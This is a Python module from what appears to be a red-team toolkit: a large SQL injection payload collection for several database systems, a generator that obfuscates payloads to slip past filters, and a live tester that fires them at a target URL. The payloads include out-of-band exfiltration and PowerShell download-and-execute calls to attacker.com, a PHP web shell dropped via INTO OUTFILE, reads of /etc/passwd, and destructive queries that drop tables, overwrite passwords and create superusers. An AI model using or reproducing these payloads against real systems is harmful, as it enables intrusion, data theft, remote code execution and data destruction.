# modules/sqli.py
# Advanced SQL Injection payload generator and live tester for red team operations

from colorama import Fore, Style
import random
import requests
import urllib.parse
import time
from typing import List, Dict, Any
from utils.encoders import apply_all_bypasses

# ──────────────────────────────────────────────
# Massive 2025–2026 SQLi payload arsenal
# Covers error-based, union, blind, time-based, stacked, OOB, RCE — all major DBMS
# ──────────────────────────────────────────────

SQLI_PAYLOADS = {
    "error": {
        "mysql": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),0)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT LOAD_FILE('/etc/passwd'))))--",
        ],
        "mariadb": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),0)--",
        ],
        "postgresql": [
            "'; SELECT CAST((SELECT version()) AS int)--",
            "AND 1=CAST((SELECT current_database()) AS int)--",
            "'; SELECT CAST((SELECT string_agg(table_name, ',') FROM information_schema.tables) AS int)--",
            "AND 1=CAST((SELECT pg_read_file('/etc/passwd')) AS int)--",
        ],
        "mssql": [
            "'; SELECT CAST(@@version AS int)--",
            "AND 1=CONVERT(int,(SELECT @@version))--",
            "AND 1=CONVERT(int,(SELECT DB_NAME()))--",
            "'; EXEC master..xp_cmdshell 'whoami'--",
            "'; EXEC xp_cmdshell 'powershell -c IEX((New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\"))'--",
        ],
        "oracle": [
            "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--",
            "' AND UTL_INADDR.GET_HOST_ADDRESS('127.0.0.1.'||(SELECT user FROM dual))>0--",
        ],
        "sqlite": [
            "' AND 1=CAST((SELECT sqlite_version()) AS int)--",
            "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table') AS int)--",
        ]
    },

    "union": {
        "mysql": [
            "' UNION SELECT 1,2,3-- -",
            "' UNION SELECT NULL,@@version,database()-- -",
            "' UNION SELECT table_name FROM information_schema.tables-- -",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- -",
            "' UNION SELECT CONCAT(username,0x3a,password) FROM users-- -",
            "' UNION SELECT LOAD_FILE('/etc/passwd')-- -",
            "' UNION SELECT 1 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[cmd]); ?>'-- -",
        ],
        "postgresql": [
            "' UNION SELECT NULL,version(),current_database()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT string_agg(concat(username,':',password),',') FROM users--",
            "' UNION SELECT pg_read_file('/etc/passwd')--",
        ],
        "mssql": [
            "' UNION SELECT NULL,@@version,DB_NAME()--",
            "' UNION SELECT name FROM sys.databases--",
            "' UNION SELECT STUFF((SELECT ',' + CAST(concat(username,':',password) AS VARCHAR) FROM users FOR XML PATH('')),1,1,'')--",
        ],
        "oracle": [
            "' UNION SELECT NULL,banner,NULL FROM v$version--",
            "' UNION SELECT table_name FROM all_tables--",
            "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com?data='||(SELECT user FROM dual)) FROM dual--",
        ],
    },

    "time_based": {
        "mysql": [
            "' AND IF(1=1,SLEEP(5),0)--",
            "' AND (SELECT BENCHMARK(10000000,MD5(1)))--",
            "' WAITFOR DELAY '0:0:5'--",
        ],
        "postgresql": [
            "'; SELECT pg_sleep(5)--",
            "AND 1=(SELECT 1 FROM pg_sleep(5))--",
        ],
        "mssql": [
            "'; WAITFOR DELAY '0:0:5'--",
            "AND 1=CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 WHERE 1=0 UNION ALL SELECT 1 FROM sys.objects FOR XML PATH) END--",
        ],
        "oracle": [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--",
            "' AND (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<=1000000)>0--",
        ],
    },

    "oob": {
        "mysql": [
            "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'attacker.com\\share\\'))--",
            "'; SELECT NAME_CONST((SELECT database()),(SELECT @@version))--",
        ],
        "postgresql": [
            "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com?data=$(base64 <<< $(SELECT version()))'--",
        ],
        "mssql": [
            "'; EXEC master..xp_dirtree '//attacker.com/share/'--",
            "'; EXEC xp_cmdshell 'nslookup attacker.com $(SELECT @@version)'--",
        ],
        "oracle": [
            "' AND UTL_HTTP.REQUEST('http://attacker.com?data='||(SELECT banner FROM v$version))>0--",
        ],
    },

    "stacked": {
        "mysql": [
            "'; DROP TABLE users--",
            "'; UPDATE users SET password='hacked' WHERE 1=1--",
            "'; INSERT INTO users (username,password) VALUES ('admin','pwned')--",
        ],
        "postgresql": [
            "'; DROP TABLE users--",
            "'; CREATE USER hacker SUPERUSER PASSWORD 'pwned'--",
        ],
        "mssql": [
            "'; EXEC sp_addlogin 'hacker', 'pwned'--",
        ],
    }
}


def generate_sqli_payloads(
    db_type: str = "all",
    sqli_type: str = "all",
    encode_type: str = None,
    double_encode: bool = False,
    obfuscate: bool = True
) -> List[Dict[str, Any]]:
    """
    Generate massive SQLi payloads with variants, encoding and obfuscation.
    Returns list of dicts ready for testing/export.
    """
    payloads = []

    db_types = [db_type] if db_type != "all" else list(SQLI_PAYLOADS.get(sqli_type, {}).keys()) if sqli_type != "all" else ["mysql", "mariadb", "postgresql", "mssql", "oracle", "sqlite"]
    sqli_types = [sqli_type] if sqli_type != "all" else list(SQLI_PAYLOADS.keys())

    for stype in sqli_types:
        if stype not in SQLI_PAYLOADS:
            continue
        for dtype in db_types:
            if dtype not in SQLI_PAYLOADS[stype]:
                continue
            for item in SQLI_PAYLOADS[stype][dtype]:
                raw = item
                variants = [
                    raw,
                    f"/*{random.randint(100,999)}*/{raw}",
                    raw.replace(" ", "/**/"),
                    f"'{raw[1:]}",
                    f"0x{raw.encode().hex()}" if "SELECT" in raw.upper() else raw,
                ]
                for variant in variants:
                    processed = apply_all_bypasses(
                        payload=variant,
                        encode_type=encode_type,
                        double_encode=double_encode,
                        obfuscate=obfuscate,
                        case_manip=True,
                        keywords=["union","select","and","or","sleep","pg_sleep","waitfor","substring","ascii","version","database","cast","convert","extractvalue","updatexml","load_file","xp_cmdshell","utl_http","dbms_pipe"]
                    )
                    payloads.append({
                        "payload": processed,
                        "description": f"SQLi | {stype.upper()} | {dtype.upper()}",
                        "original": raw
                    })

    random.shuffle(payloads)
    return payloads


def run_live_sqli(
    base_url: str,
    param: str,
    payloads: List[Dict[str, Any]],
    delay: float = 1.5,
    timeout: int = 20,
    proxies: Dict = None
) -> List[Dict[str, Any]]:
    """
    Perform live SQL injection testing with enhanced detection.
    Returns list of confirmed/potential findings.
    """
    print(f"\n{Fore.RED}Starting SQLi testing → {base_url}?{param}=[PAYLOAD]{Style.RESET_ALL}")
    print(f"Testing {len(payloads)} payloads. Progress shown live.\n")

    session = requests.Session()
    session.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
    })

    if proxies:
        session.proxies = proxies

    findings = []
    total = len(payloads)

    error_indicators = [
        "sql syntax", "mysql_fetch", "unclosed quotation", "ora-", "pg_", "sqlite_", "you have an error",
        "microsoft ole db", "syntax error", "near", "ODBC driver"
    ]
    leak_indicators = [
        "@@version", "version()", "database()", "current_database()", "information_schema",
        "users", "password", "root@localhost", "schema_name"
    ]

    for idx, entry in enumerate(payloads, 1):
        payload = entry["payload"]
        try:
            target_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            is_time = any(kw in payload.lower() for kw in ["sleep", "pg_sleep", "waitfor", "benchmark", "dbms_pipe"])
            start = time.time()
            response = session.get(target_url, timeout=timeout, verify=False)
            elapsed = time.time() - start

            status_str = f"{Fore.GREEN}{response.status_code}{Style.RESET_ALL}" if response.status_code == 200 else \
                         f"{Fore.YELLOW}{response.status_code}{Style.RESET_ALL}"

            hint = ""
            reason = ""

            if is_time and elapsed > 4.5:
                hint = f"{Fore.RED}TIME-BASED VULN{Style.RESET_ALL}"
                reason = f"Time delay detected ({elapsed:.2f}s)"
            elif any(err in response.text.lower() for err in error_indicators):
                hint = f"{Fore.RED}ERROR-BASED VULN{Style.RESET_ALL}"
                reason = "SQL error message leaked"
            elif any(leak in response.text.lower() for leak in leak_indicators):
                hint = f"{Fore.RED}DATA LEAK VULN{Style.RESET_ALL}"
                reason = "Sensitive data leaked"
            else:
                hint = "clean"

            print(f"  [{idx:3d}/{total:3d}]  {payload[:62]:<62} → Status: {status_str} | {hint} ({elapsed:.2f}s)")

            if hint != "clean":
                print(f"  {Fore.RED}→ Vulnerable confirmed – {reason}{Style.RESET_ALL}")
                findings.append({
                    "url": target_url,
                    "payload": payload,
                    "status": "Vulnerable",
                    "reason": reason,
                    "elapsed": round(elapsed, 2),
                    "description": entry.get("description", "SQL Injection")
                })

            time.sleep(delay + random.uniform(0.5, 2.5))

        except requests.exceptions.Timeout:
            print(f"  [{idx:3d}/{total:3d}]  {payload[:62]:<62} → {Fore.RED}TIMEOUT – Likely time-based blind vuln{Style.RESET_ALL}")
            findings.append({
                "url": target_url,
                "payload": payload,
                "status": "Vulnerable (timeout)",
                "reason": "Request timed out – possible blind time-based",
                "elapsed": timeout
            })
        except requests.exceptions.RequestException as exc:
            print(f"  [{idx:3d}/{total:3d}]  {payload[:62]:<62} → {Fore.YELLOW}Request failed: {str(exc)[:60]}{Style.RESET_ALL}")

    return findings


def get_payloads_for_export(payloads: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Prepare payload list for export (json/txt/html)."""
    return [{
        "payload": p["payload"],
        "description": p.get("description", "SQL Injection payload"),
        "original": p.get("original", ""),
        "type": "SQLi"
    } for p in payloads]


if __name__ == "__main__":
    print("This is a module — use main.py to execute.")